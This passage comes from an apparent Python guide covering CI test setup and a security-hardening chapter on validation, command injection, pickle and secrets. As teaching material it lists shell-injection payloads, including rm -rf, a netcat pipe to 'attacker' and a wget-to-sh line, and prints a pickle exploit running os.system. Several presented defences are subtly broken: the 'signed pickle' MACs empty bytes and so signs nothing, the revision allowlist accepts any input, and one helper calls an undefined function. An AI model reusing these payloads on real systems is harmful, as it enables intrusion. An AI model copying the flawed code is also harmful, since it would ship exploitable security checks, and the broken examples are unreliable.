#     steps:
#       - uses: actions/checkout@v4
#       - uses: astral-sh/setup-uv@v5
#         with: { enable-cache: true }   # cache the resolved environment
#       - run: uv run --python ${{ matrix.python }} --frozen \
#               pytest -m "not slow" -q --cov --cov-report=xml
#       - uses: actions/upload-artifact@v4
#         if: always()                 # upload even on failure
#         with: { name: cov-${{ matrix.python }}, path: coverage.xml }
#
#   nightly:
#     if: github.event_name == 'schedule'
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - run: uv run --frozen pytest -m slow
#       - run: uv run --frozen mutmut run
#       - run: uv run --frozen pytest --fuzzing-seed=0 -p no:randomly

# --- Determinism -----------------------------------------------------------
# - PYTHONHASHSEED=0 in a job that depends on set or dict ORDER. Better:
#   write the test so it does not depend on order at all.
# - pytest-randomly randomises test order AND reseeds random, which finds
#   inter-test coupling. Keep it, and run one CI job without it to distinguish
#   an order dependency from a genuine failure.
# - Any test that reaches the network, the clock or the filesystem outside
#   tmp_path is non-deterministic. Freeze the clock; never trust the network.
# - VCR or a fake HTTP server for third-party HTTP; a real database in a
#   container for the database tests; nothing real for anything else.
# - filterwarnings = ["error"] turns a new DeprecationWarning from a
#   dependency into a test failure on the day it appears, which is the only
#   warning policy that has ever been useful.

# --- Speed, in order of effect --------------------------------------------
# 1. Do not re-resolve. uv sync --frozen, and a cache keyed on the lock file.
# 2. Do not re-download. A cached environment removes the install from the
#    critical path almost entirely.
# 3. Parallelise. pytest-xdist: pytest -n auto --dist loadscope. loadscope
#    keeps the tests of one class or module on one worker, which is correct
#    for anything with module-level state and usually faster than load.
# 4. Cut what does not need to run. -m "not slow" on every push, full suite
#    on main and nightly.
# 5. Fix the slow tests. A 40-second test is a design problem: it is doing
#    real work that belongs in a unit, or it is waiting on a sleep.

# --- Pre-commit ------------------------------------------------------------
# .pre-commit-config.yaml
# repos:
#   - repo: https://github.com/astral-sh/ruff-pre-commit
#     rev: v0.14.0
#     hooks: [{ id: ruff, args: [--fix] }, { id: ruff-format }]
#   - repo: https://github.com/pre-commit/pre-commit-hooks
#     rev: v5.0.0
#     hooks:
#       - { id: check-toml }
#       - { id: check-yaml }
#       - { id: end-of-file-fixer }
#       - { id: trailing-whitespace }
#       - { id: check-added-large-files }
#       - { id: detect-private-key }        # see 16.4
#         args: [--baseline, .secrets.baseline]
#   - repo: local
#     hooks:
#       - { id: pytest-fast, name: fast tests, entry: pytest -m "not slow",
#           language: system, pass_filenames: false, always_run: true }
#
# The local pytest hook is the one that pays for itself. A commit that breaks a
# test never reaches the branch, and the feedback arrives in seconds rather
# than minutes. Keep it to the fast marker; a full-suite pre-commit hook is
# bypassed within a week.

The pre-commit hook is advisory, not enforcing. It runs for the developer, on their machine, and it does not run on a pull request from a fork, on a commit made by an editor that bypasses hooks, or on any commit made with --no-verify. Everything it checks must also be a CI job, or it is a convenience rather than a control. The same is true of the local test hook: it is a productivity tool whose value is the fast feedback, not a guarantee.

Exercises 15

  1. Build a fixture hierarchy of five fixtures at four different scopes, then use pytest --setup-show to record the actual construction order and confirm it matches the declared dependency graph.
  2. Write a suite that passes with a session-scoped mutable fixture and fails under pytest -n 4, then convert it to a function-scoped factory fixture and record the statement count before and after.
  3. Parametrise a parser over 40 cases including invalid UTF-8, an empty input, a 10 MB input and a truncated header, and confirm each failure message is specific to its cause.
  4. Write the same test three ways — with unittest.mock.patch, with a hand-written fake, and against a real sqlite3 database — and compare the line counts, the failure modes and the number of bugs each version could have found.
  5. Patch a function imported with from x import y at both the defining and the using module, and demonstrate in a test which one takes effect and which silently does nothing.
  6. Write a Hypothesis state machine for a bounded LRU cache, and shrink a deliberately introduced eviction bug to the shortest failing operation sequence.
  7. Take a module with 94% line coverage, remove every assertion from its tests, confirm the coverage figure is unchanged, then run a mutation-testing pass and record how many mutants the assertions killed.
  8. Add doctests to a formatting module, then change the error message, and record the two tests that fail and the two files that now need changing for a legitimate improvement.
  9. Shard a 400-test suite four ways with pytest-shard, measure the wall-clock improvement and the per-shard setup overhead, and state the suite size at which sharding stops paying.
  10. Break one inter-test ordering dependency and detect it with pytest-randomly and with PYTHONHASHSEED, and identify the shared mutable state responsible.

16 · Security and Hardening

16.1 Validating untrusted input16.2 Command injection16.3 Unsafe deserialisation16.4 Secrets, hashes and credentials16.5 Path traversal and temporary files16.6 XML entity attacks16.7 Dependency and supply-chain risk

The security properties of a Python program are mostly properties of the boundaries it crosses, and there are a small number of boundaries where a mistake is immediately, remotely exploitable. This chapter enumerates them. The recurring theme is that Python’s default behaviour is safe at four of these boundaries and actively unsafe at four others — subprocess with a shell, pickle, weak hash functions for passwords, and the standard library’s permissive XML parser are the four that matter most, and each has a safe alternative that is one argument away.

16.1 Validating untrusted input

Validation establishes that a value has a shape the program can reason about, and it belongs at the boundary — the HTTP handler, the queue consumer, the file reader — and nowhere else. It is not a substitute for sanitisation, and the two are not synonyms: validation answers "is this what I asked for?", sanitisation answers "is this safe to put into a context that interprets it?" Most injection vulnerabilities are a validation failure, and most cross-site scripting is a sanitisation failure, and conflating the concepts leads to code that does one and believes it has done the other.

from __future__ import annotations

import re
import unicodedata
from typing import Annotated, Final
from pydantic import BaseModel, Field, field_validator, ValidationError

# --- Allowlist over denylist ---------------------------------------------
# A denylist enumerates what is forbidden and is defeated by anything not
# thought of: an unfamiliar encoding, a homoglyph, a control character, a
# format string, a template expression, a path separator on another platform.
# An allowlist enumerates what is permitted, and everything else is rejected
# by default. The allowlist is the only one that fails safe.
_SAFE_ID: Final = re.compile(r"^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$")
_FORBIDDEN: Final = re.compile(r"[\x00-\x1f\x7f<>\"'`;|&$(){}\[\]\\]")

def validate_slug(raw: str) -> str:
    if not isinstance(raw, str):
        raise TypeError("expected str")
    if len(raw) > 63:
        raise ValueError("too long")
    s = unicodedata.normalize("NFKC", raw).lower()      # folds compatibility forms
    if not _SAFE_ID.fullmatch(s):
        raise ValueError("not a valid slug")
    return s

# NFKC normalisation is not a security control by itself. It maps fullwidth
# characters to ASCII, which is useful; it does not remove a zero-width
# character, a right-to-left override, or a homoglyph, and it cannot. Unicode
# confusables need an explicit table, and the honest answer for most products
# is to restrict the alphabet rather than to attempt detection.

# --- Declarative validation with pydantic ---------------------------------
# The strongest version of the same idea: describe the shape once, and get
# parsing, coercion, validation, error reporting and a typed object.
class CreateOrder(BaseModel):
    model_config = {"extra": "forbid", "str_strip_whitespace": True}
    customer_id: int = Field(gt=0, le=2**62)
    currency: Annotated[str, Field(pattern=r"^[A-Z]{3}$")]
    lines: list[OrderLine] = Field(min_length=1, max_length=500)
    idempotency_key: str = Field(min_length=16, max_length=128,
                                 pattern=r"^[A-Za-z0-9_-]+$")

class OrderLine(BaseModel):
    model_config = {"extra": "forbid"}
    product_id: int = Field(gt=0)
    qty: int = Field(ge=1, le=10_000)

def handler(body: bytes) -> tuple[int, dict]:
    try:
        payload = CreateOrder.model_validate_json(body)
    except ValidationError as exc:
        # Return the structured errors. Do not echo the input back: that is a
        # reflection vector, and it puts attacker-controlled text into a log
        # and into a browser.
        return 422, {"errors": exc.errors(include_url=False, include_input=False)}
    return 201, {"customer_id": payload.customer_id}

# The properties that matter:
#   extra="forbid"    an unexpected field is an error, not an ignored field.
#                     This is what stops a mass-assignment vulnerability.
#   strict=False      allows "1" -> 1. Set strict=True where coercion could
#                     change meaning (see the note below).
#   constraints in Field, not in the handler  the rule and the parsing of the
#                     rule live together and cannot drift apart.

# --- Coercion is a semantic change, not a convenience --------------------
def f(x: int) -> None: ...
f("1")                 # TypeError at runtime? No -- the annotation is not
                        # enforced. Python does not check it (see 9.1).
# In pydantic, f(Model) with x: int DOES coerce "1" to 1 by default, and also
# coerces True to 1, and 1.0 to 1. Any of those can be a security-relevant
# difference: a boolean that is meant to be false arriving as 1 is a
# privilege bug. Use strict=True, or a StrictInt, at a boundary.

# --- Validation is not sanitisation ---------------------------------------
# A value can be perfectly valid and still dangerous in a context that
# interprets it. Validate the shape, then treat the value as data:
#   - HTML output  -> escape at the point of output, with a library
#   - SQL          -> bind the parameter (see 12.3)
#   - shell        -> pass an argument vector (see 16.2)
#   - a path       -> resolve and confine (see 16.5)
#   - a URL        -> parse, allowlist the scheme and the host
#   - a template   -> pass data, not template source
# Escaping at output time is the rule, not at input time, because the same
# value may be read by two different consumers.

# --- Where the boundary actually is ---------------------------------------
# Every one of these receives untrusted bytes and must validate:
#   HTTP request body, query string, path parameters, headers, cookies
#   environment variables in a container that accepts a tenant's image
#   rows in a queue or a table populated by another system
#   file contents read from a user-writable path
#   command-line arguments, when the process is a library used by others
#   values deserialised from a cache written by an earlier version
# The list is not exhaustive and the correct posture is that there is no
# trusted input except the program's own constants.
BoundaryValidateThen, separately
JSON bodySchema, required fields, ranges, unknown fieldsBind into SQL; escape into HTML; never eval the body
Query parameterType, length, format; allowlist for sort and filterBind as a parameter; the identifier positions still need a whitelist
Path parameterShape, length, character setEscape before it reaches the router’s URL parser
Upload filenameNothing useful — discard it and generate a nameNever use the supplied name as a path; see 16.5
Environment variableType and range; treat a container env as tenant inputNever build a shell command from it
Queue messageThe same schema as the HTTP bodyTreat the producing system as untrusted even when it is yours

Rejection is not sanitisation. A function that strips < from input and then documents itself as XSS-safe is wrong twice: it corrupts legitimate data, and it leaves the second, third and fourth output contexts unprotected. A value that is valid for storage is not thereby safe to place into HTML, into a log format string, into a spreadsheet formula or into a shell. Validate the shape; escape per context at the point of use; and never let user data become a format string, a query, a path or a command.

16.2 Command injection

Command injection occurs when untrusted data becomes part of a command line. The mechanism is the same as SQL injection: a value that should have been data is parsed as code, because the code and the data were concatenated into one string. The fix is also the same — keep them separate — and in the shell case that means passing an argument vector and letting execve do the separating.

from __future__ import annotations

import os, shlex, subprocess, shutil, sys, tempfile
from pathlib import Path

# --- The vulnerability ----------------------------------------------------
# Four equally unsafe spellings of the same defect.
def vulnerable_shell(filename: str) -> str:
    return subprocess.run(f"cat /data/{filename}", shell=True,
                          capture_output=True, text=True).stdout
def vulnerable_concat(filename: str) -> str:
    return subprocess.run("cat /data/" + filename, shell=True,
                          capture_output=True, text=True).stdout
def vulnerable_percent(filename: str) -> str:
    return subprocess.run("cat /data/%s" % filename, shell=True,
                          capture_output=True, text=True).stdout
def vulnerable_os(filename: str) -> str:
    return os.system(f"echo {filename}")              # always a shell
# Payloads, all of them one string:
#   "; rm -rf / #"        command separator
#   "$(id)"              command substitution
#   "`id`"               the same with backticks
#   "| nc attacker 443"  pipe
#   "&& wget -O- http://x | sh"   AND-list plus a pipe
#   $'\n' id             a newline; many sanitising filters check for it late
#   "a\nb"               a newline inside an otherwise innocent-looking value

# --- The defence: an argument vector, and no shell ------------------------
def safe_cat(path: Path) -> bytes:
    resolved = path.resolve(strict=True)              # 16.5: confine it
    return subprocess.run(
        ["cat", "--", str(resolved)],                 # "--" ends the options
        capture_output=True, check=True, timeout=30,
    ).stdout
# The list form calls execve directly. There is no shell, so ; | & $ ` \n
# are ordinary characters in an argument and cannot start a command. The
# subprocess module performs no quoting, no splitting and no globbing.

# --- shell=True, and the four things it costs -----------------------------
# 1. Injection, as above.
# 2. A whole-shell startup per call, which is the dominant cost in a loop.
# 3. The usual suspects: $PATH is searched, the working directory is inherited,
#    and on POSIX the process becomes a process-group leader whose children
#    outlive it (see 11.8).
# 4. No argument boundary at all, so a value containing a space becomes two
#    arguments even with no metacharacter present.
# When shell=True is genuinely required -- a pipeline the code cannot express
# as an argument list -- quote every substitution with shlex.quote and keep the
# literal part of the string in this file.

def only_when_necessary(pattern: str) -> str:
    assert pattern in {"*.gz", "*.bz2", "*.xz"}     # an allowlist, not a quote
    quoted = shlex.quote(pattern)
    return subprocess.run(f"lzcat {quoted}", shell=True, check=True).returncode

# --- Never invoke a shell to do what the standard library does ------------
SHELL_MEANWHILE: dict[str, str] = {
    "ls -l":     "use os.scandir() and pathlib.Path.stat()",
    "cd":        "use os.chdir() or a path",
    "pwd":       "use pathlib.Path.cwd()",
    "cat":       "use Path.read_bytes() / read_text()",
    "cp":        "use shutil.copy2()",
    "mv":        "use shutil.move()",
    "rm":        "use Path.unlink(missing_ok=True) or shutil.rmtree()",
    "mkdir":     "use Path.mkdir(parents=True, exist_ok=True)",
    "echo":      "use print() or write_bytes()",
    "find":      "use Path.glob() or Path.walk() (3.12+)",
    "grep":      "iterate the files, or re over the text",
    "sed/awk":   "str.replace(), re.sub(), or a real parser",
    "tar/zip":   "use tarfile, zipfile, shutil.make_archive",
    "ps":        "use psutil",
    "kill":      "os.kill(pid, signal.SIGTERM), after a wait and an escalation",
    "curl/wget": "use urllib.request, httpx or requests -- and then the
                 network policy, the TLS settings and the redirect limit are
                 all yours to get right",
}
# Each of these converts a command line into an API call, which removes an
# entire class of injection along with a shell dependency, and is almost always
# faster and more portable.

# --- Environment hygiene, when a subprocess is unavoidable ----------------
def minimal_env(extra: dict[str, str] | None = None) -> dict[str, str]:
    env = {"PATH": "/usr/local/bin:/usr/bin:/bin", "LC_ALL": "C"}
    env.update(extra or {})
    return env

subprocess.run(["/usr/bin/git", "rev-parse", "HEAD"],
               env=minimal_env({"HOME": "/tmp"}), cwd="/tmp",
               check=True, capture_output=True, timeout=10)

# --- Validating a path BEFORE handing it to a program ---------------------
GIT_SUFFIXES = {".git", ".hg", ".svn"}

def safe_path_argument(name: str) -> str:
    """Reduce a candidate revision to one of a closed set of safe forms."""
    if name in {"HEAD", "HEAD~1", "HEAD^"} or GIT_SUFFIXES:
        return name
    if re.fullmatch(r"[0-9a-f]{7,40}", name):         # a commit hash
        return name
    if re.fullmatch(r"v?\d+\.\d+(\.\d+)?", name):    # a tag or a version
        return name
    raise ValueError(f"not a safe revision: {name!r}")

# Note what this is NOT: it is not a filter, and it is not a defence. It is
# an allowlist, which is the only kind of filter that works -- and it is still
# second-best, because the first choice is to not pass user data to a program
# that interprets arguments as code. The library is the defence; the allowlist
# is documentation.

# --- A signal of intent, for linters ---------------------------------------
# Bandit flags subprocess with shell=True, os.system and os.popen:
#   bandit -r src -lll
# Also: S602/S603/S607 in ruff, and the --check bandit gate in pre-commit.
# A lint rule for this catches the defect in review, at the moment the line is
# written, which is the only time anyone is present to consider it.

os.system, os.popen and commands.getoutput are shells by definition and cannot be used safely with untrusted input at all. The one-line rule: subprocess.run with a list and no shell=True, or an existing library function. If a call requires a shell to express, the correct response is to ask why, because the answer is almost always that the standard library or shutil already does it.

Caveat on Windows: the argument vector is not the whole story. Windows passes a single command-line string to CreateProcess, and list2cmdline reconstructs it. That quoting is correct for arguments but does not neutralise metacharacters inside a cmd.exe command, and shell=True on Windows runs through cmd.exe rather than a POSIX shell, with different metacharacters. Additionally, CreateProcess resolves executables by an order that includes the current working directory, so an attacker who can write an executable to the working directory gets code execution from an apparently safe ["name", "arg"] call. Use an absolute path for the program, always.

16.3 Unsafe deserialisation

Python’s standard pickle format is a small stack language for a virtual machine, and unpickling a byte stream executes the instructions in it. It is not a data format with a code path; it is a code execution mechanism with a data path. Any design that lets an untrusted party supply a pickle gives them arbitrary code execution as the user running the unpickler, with no further vulnerability required.

import pickle, json, io, os, sys, base64, hmac, hashlib
from typing import Any

# --- Why pickle executes code ---------------------------------------------
# The format encodes a program, not a structure. A reduce value is a callable
# that the unpickler will invoke, and __reduce__ returns one.
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(Exploit())                 # 40 innocuous bytes
print("size:", len(payload), "-> look:", payload[:20])

# A pickle can also import modules, access __globals__, read files, open
# sockets, and modify os.environ. There is no flag that makes pickle safe.

# --- The rule -------------------------------------------------------------
# NEVER unpickle bytes you did not create, in a process whose privileges you
# care about. That includes: a file uploaded by a user, a value in a cache or
# a queue written by another process or another host, a message from a
# client, a model file from an untrusted source, and anything downloaded.

# --- Safe alternatives ----------------------------------------------------
# 1. JSON, for everything JSON can express.
def load_config(raw: bytes) -> Any:
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("configuration must be an object")
    return obj

# JSON is a data format: no callables, no imports, no code. The cost is its
# type system: only objects, arrays, strings, numbers, booleans and null.
# Where a richer type is needed, decode and then validate (see 16.1), never
# decode and then reconstruct arbitrary objects.

# 2. A typed schema over JSON, when the shape must be enforced.
from pydantic import BaseModel
class Settings(BaseModel):
    host: str
    port: int = 8080
    debug: bool = False
settings = Settings.model_validate_json(raw)

# 3. MessagePack, CBOR, TOML, Parquet -- data formats with a defined type
#    system and no code path. Suitable for interchange and for files that
#    must be readable by another language.
#    import msgpack; msgpack.unpackb(raw, raw=False, strict_map_key=True)

# 4. Parquet, Arrow, HDF5, netCDF for arrays and tables: none of them
#    evaluates, and all of them carry a schema.

# --- YAML -----------------------------------------------------------------
import yaml
# SAFE:
cfg = yaml.safe_load(raw)                 # only the standard YAML types
# UNSAFE, and it is the default in some codebases still in the wild:
cfg = yaml.load(raw)                      # Loader=yaml.Loader -> instantiates
cfg = yaml.unsafe_load(raw)               # explicitly named
# yaml.Loader, yaml.UnsafeLoader and yaml.FullLoader construct arbitrary Python
# objects, and yaml.Loader is the historical default of load(). Enforce
# safe_load, and add a lint rule: S506 in bandit, and ruff's S506 check.

# --- marshal --------------------------------------------------------------
# marshal is faster than pickle and version-specific: a stream written by one
# Python version is not guaranteed to load in another. It still reconstructs
# some object types, and it is explicitly documented as "not intended to be
# secure against maliciously constructed data". Use it for .pyc files only.

# --- dill, cloudpickle and joblib -----------------------------------------
# dill extends pickle with lambdas, closures and interpreter state, and is
# correspondingly more capable and more dangerous. cloudpickle is designed
# for exactly this and is what several distributed frameworks use for their
# workers -- which means an untrusted job is arbitrary code by design.
# joblib.dump and numpy.save are safe; joblib with a compressible object and
# a path controlled by the caller is a pickle under a different name.
# Every "fast serialisation" library in Python is a pickle. Verify the
# format before assuming a file extension means anything: the extension is
# whatever the writer chose.

# --- A signed-pickle construction, and its limits -------------------------
# If you genuinely must move objects, sign the bytes. The key management is
# the hard part; a key stored next to the data proves nothing.
def dumps_signed(obj: Any, key: bytes) -> bytes:
    mac = hmac.new(key, b"", hashlib.sha256).digest()
    return b"PYOS1" + mac + pickle.dumps(obj, protocol=5)

def loads_signed(blob: bytes, key: bytes) -> Any:
    if not blob.startswith(b"PYOS1"):
        raise ValueError("not a signed pickle")
    mac, body = blob[5:37], blob[37:]
    expect = hmac.new(key, b"", hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expect):
        raise ValueError("bad signature")
    return pickle.loads(body)
# This is correct: a signature nobody can forge is a pickle nobody can forge.
# It is also a lot of machinery for a case that should be resolved by choosing
# JSON, and it still does not help if the key is available to the attacker --
# which, in an application holding both the key and the data, it usually is.

# --- Type restrictions, and why they are not a defence ---------------------
def restricted_loads(blob: bytes) -> Any:
    class Restricted(pickle.Unpickler):
        def find_class(self, module: str, name: str) -> Any:
            if module == "builtins" and name in {"list", "dict", "set", "frozenset",
                                                 "tuple", "int", "float", "str",
                                                 "bool", "bytes", "complex"}:
                return getattr(__builtins__ if isinstance(__builtins__, dict)
                               else __builtins__, name) if False else _safe(name)
            raise pickle.UnpicklingError(f"refused: {module}.{name}")
    return Restricted(io.BytesIO(blob)).load()
# An allowlist of picklable names is a real mitigation for data that is
# otherwise attacker-controlled, and it is still a blacklist in disguise: a
# gadget chain that uses only allowed names is sufficient, and the class of
# those names is not stable across Python versions. Prefer JSON.

The practical rule for reviewing an unfamiliar codebase is short: find every pickle.load, pickle.loads, yaml.load without SafeLoader, torch.load, numpy.load with allow_pickle=True, joblib.load, shelve.open and dill.load, and determine for each whether the bytes could have come from outside the trust boundary. Each of those that could is a remote code execution vulnerability. The numpy.load default is the false positive that costs the most review time: since 1.16.3 it defaults to allow_pickle=False, so the flag is only needed to make it work, and a codebase that sets it is a codebase that has decided to accept the risk explicitly.

FormatExecutes codeInteroperablePreserves typesUse it for
JSONNoYes, everywhereNo — and it does not need toAnything crossing a trust boundary
YAML with safe_loadNoYesSomeConfiguration, when a nested, commented format is required
YAML with loadYesYesPython objectsNothing that touches untrusted input
MessagePack, CBOR, TOMLNoYesNoCompact interchange
Parquet, ArrowNoYesTabularColumnar data, large tables
pickleYesNoYesTrusted, same-machine, same-version caching
marshalPartlyNo, and not across versionsYes.pyc files only
dill, cloudpickleYes, by designNoClosures, lambdasSame-process, trusted only

16.4 Secrets, hashes and credentials

Three distinct problems are grouped here because they are usually confused. Generating a secret requires a cryptographically secure source. Storing a password requires a slow, salted, adaptive hash. Storing a credential requires not putting it in the source tree. The standard library provides the first, provides only a building block for the second, and provides the environment-variable pattern for the third — each of which is misused often enough to be worth stating explicitly.

import os, sys, hashlib, hmac, secrets, string, stat, time
from pathlib import Path

# --- Generation: secrets, never random ------------------------------------
token = secrets.token_urlsafe(32)        # 43 characters, 256 bits of entropy
api_key = secrets.token_hex(32)          # 64 hex characters, 256 bits
salt = secrets.token_bytes(16)
number = secrets.randbelow(10**6)        # uniform, no modulo bias
# secrets.choice(seq), secrets.randbits(k), secrets.compare_digest(a, b)
print(len(token), len(api_key), len(salt), number)

# random and its seeded generators are NOT for secrets.
#   random.random()      a Mersenne Twister. 624 words of internal state, the
#                        state is recoverable from 624 consecutive outputs, and
#                        the sequence is fully determined by a 32-bit seed.
#   random.randint       derived from the same state, so equally predictable.
#   random.choice        same, and famously biased unless the algorithm is
#                        randbelow.
#   numpy.random         the Mersenne Twister again.
#   uuid.uuid4()         fine: 122 random bits from os.urandom.
#   The rule: secrets for anything that authenticates or authorises, random
#   for sampling, simulation, shuffling and jitter.

# --- Password hashing: a slow, salted, adaptive function ------------------
# What is wrong with each obvious choice:
#   plain SHA-256      fast. A GPU does billions per second, so a database dump
#                      is cracked in minutes. Speed is a defect.
#   SHA-256 + salt     fixes rainbow tables, leaves the speed. The salt also
#                      cannot be stored in a column if the database is dumped.
#   bcrypt, scrypt,    deliberately slow, salted, and parameterised so the
#   Argon2, PBKDF2     cost can be raised as hardware improves.
# Argon2id is the current first choice: memory-hard, so a GPU or an ASIC is
# no faster per unit of memory than a CPU.

# pip install argon2-cffi
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError, VerificationError, InvalidHashError

ph = PasswordHasher(time_cost=3, memory_cost=65536,   # 64 MiB
                    parallelism=4, hash_len=32, salt_len=16)
stored = ph.hash("correct horse battery staple")     # includes the parameters
# $argon2id$v=19$m=65536,t=3,p=4$[b64 salt]$[b64 hash]
# The salt and the parameters travel INSIDE the stored value, so raising the
# cost later does not invalidate existing hashes: rehash on next successful
# login.

def verify_password(stored_hash: str, candidate: str) -> bool:
    try:
        return ph.verify(stored_hash, candidate)
    except (VerifyMismatchError, VerificationError):
        return False
    except InvalidHashError:
        return False                          # corrupt row; log and fail closed

def needs_rehash(stored_hash: str) -> bool:
    return ph.check_needs_rehash(stored_hash) # parameters have been raised

# bcrypt: pip install bcrypt. cost=12 is a reasonable 2026 default; it
# truncates at 72 bytes, so pre-hash with SHA-256 and base64 if long
# passwords are permitted. scrypt: hashlib.scrypt, memory-hard, but the
# parameter ergonomics are worse than argon2. PBKDF2-HMAC-SHA256:
# hashlib.pbkdf2_hmac, available in the standard library, acceptable where
# argon2 cannot be installed, 600,000+ iterations for SHA-256.
print(hashlib.pbkdf2_hmac("sha256", b"pw", salt, 600_000).hex()[:16])

# --- Token comparison, in constant time -----------------------------------
# == on a hash or a signature leaks its length prefix through timing. The
# difference is small and remote, and it is a real side channel.
def token_matches(a: str, b: str) -> bool:
    return hmac.compare_digest(a.encode(), b.encode())

# --- Never in the source tree ---------------------------------------------
# Twelve things that get committed and should not, in rough order of damage:
#   1. A private key, PEM or otherwise, in a config file
#   2. A .env file (it works locally, so it gets committed)
#   3. A connection string with a password in it
#   4. A cloud access key ID and secret
#   5. A database URL pasted into a docstring to make an example readable
#   6. An AWS_SESSION_TOKEN, and the credentials file that holds one
#   7. A signing secret in a Flask, Django or FastAPI settings module
#   8. A JWT secret, in any form
#   9. A webhook signing secret, usually with a comment saying it is a test
#      value, which is how a test value becomes the production value
#  10. A basic-auth password in a URL, which is also written to the access log
#  11. A password in a pytest fixture, a doctest, or a code example
#  12. Anything under secrets/, even if the file is "just an example"
#
# The defences, in order:
#   pre-commit detect-private-key and a secret scanner with a baseline file
#   a server-side scanner (gitleaks, trufflehog) in CI, which also covers
#     history, and the reason a scanner with --all-commits matters
#   .gitignore for .env, *.pem, *.key, *.p12, *.pfx, secrets/
#   rotation on any suspected exposure, immediately, before the cleanup
# Removing a secret from the tip of a branch does NOT remove it from history,
# and the object is still reachable. Rotation is the only complete remedy.

# --- Loading configuration ------------------------------------------------
# Environment variables, from the process environment, never from a file in
# the repository. Read once, validate, and fail fast.
API_URL = os.environ.get("ACME_API_URL")
API_TOKEN = os.environ.get("ACME_API_TOKEN")
if not API_URL or not API_TOKEN:
    raise SystemExit("ACME_API_URL and ACME_API_TOKEN must be set")

# In a container, a secret mounted from the orchestrator's store arrives as a
# file path in an environment variable, not as the value. Read the file:
def read_secret_file(env_name: str = "ACME_TOKEN_FILE") -> str:
    path = os.environ.get(env_name)
    if not path:
        raise SystemExit(f"{env_name} not set")
    p = Path(path)
    if p.is_symlink() or not p.is_file():
        raise SystemExit(f"{path} is not a regular file")
    return p.read_text().strip()

# --- File permissions ------------------------------------------------------
# A secret file that is world-readable is a secret file that has leaked. This
# is checkable and is checked by nothing by default.
def assert_private(path: Path) -> None:
    mode = path.stat().st_mode
    if mode & (stat.S_IRGRP | stat.S_IROTH):
        path.chmod(0o600)
        print(f"tightened permissions on {path}")

# The same applies to the directory: ~/.ssh must be 700, ~/.ssh/id_rsa must
# be 600, or OpenSSH refuses to use the key. That refusal is the model -- make
# the unsafe state impossible to use rather than merely discouraged.
PurposePrimitiveWhy
Token, salt, nonce, API keysecretsReads os.urandom; suitable for adversarial prediction
Password storageArgon2id, bcrypt, scrypt, PBKDF2Slow and memory-hard, so a dump is not cheaply attackable
Data integrity, no adversarySHA-256, SHA-3Collision resistance and speed; no salt needed
Digital signature, HMACEd25519, RSA-PSS, ECDSA P-256, HMAC-SHA-256Asymmetric for third-party verification; HMAC for a shared secret
Key derivation from a passwordArgon2id, or hashlib.scrypt / pbkdf2_hmacDeliberately expensive and parameterised
File integrity checksumSHA-256Detects corruption, not tampering

Requirements: a password is stored as a hash, never reversibly. A "recoverable" password is a password stored with worse protection. Caveats: password length and complexity rules are a much weaker control than a leaked-password corpus check, a rate limit and MFA. A 24-character passphrase is stronger and better remembered than P@ssw0rd!, and an offline dictionary attack against a properly hashed database is not stopped by a substitution of a for @. And every user has a different threat model: a breach of the hash database is a memory-hard-hash problem, while a compromised endpoint is a session-cookie problem, and the two need different controls.

16.5 Path traversal and temporary files

A path is a string that a filesystem interprets, and every interpretation of a user-supplied path string is a capability the user did not intend to grant.
